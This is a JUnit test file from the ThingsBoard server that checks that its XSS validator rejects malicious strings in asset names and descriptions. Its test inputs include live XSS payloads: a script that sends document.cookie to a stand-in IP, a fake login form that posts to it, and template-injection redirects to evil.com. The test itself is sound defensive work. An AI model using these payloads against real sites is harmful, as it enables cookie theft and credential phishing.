/**
 * Copyright © 2016-2026 The Thingsboard Authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.thingsboard.server.dao.service;

import com.fasterxml.jackson.databind.node.TextNode;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.thingsboard.common.util.JacksonUtil;
import org.thingsboard.server.common.data.asset.Asset;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

public class NoXssValidatorTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "aboba<a href='a' onmouseover=alert(1337) style='font-size:500px'>666",
            "9090<body onload=alert('xsssss')>90909",
            "qwerty<script>new Image().src=\"http://192.168.149.128/bogus.php?output=\"+document.cookie;</script>yyy",
            "bambam<script>alert(document.cookie)</script>",
            "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
            "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
            "   <img src= \"http://site.com/\"  >  ",
            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe",
            "{{constructor.constructor('location.href=\"https://evil.com\"')()}}",
            "    {{constructor.constructor('alert(1)')()}}",
            "{{}}",
            "{{{constructor.constructor('location.href=\"https://evil.com\"')()}}}",
            "test {{constructor.constructor('location.href=\"https://evil.com\"')()}} test",
            "{{#if user}}Hello, {{user.name}}{{/if}}",
            "{{ user.name }}"
    })
    public void givenEntityWithMaliciousPropertyValue_thenReturnValidationError(String maliciousString) {
        Asset invalidAsset = new Asset();
        invalidAsset.setName(maliciousString);

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

    @Test
    public void givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError() {
        Asset invalidAsset = new Asset();
        String maliciousValue = "qwerty<script>alert(document.cookie)</script>qwerty";
        invalidAsset.setAdditionalInfo(JacksonUtil.newObjectNode()
                .set("description", new TextNode(maliciousValue)));

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

}
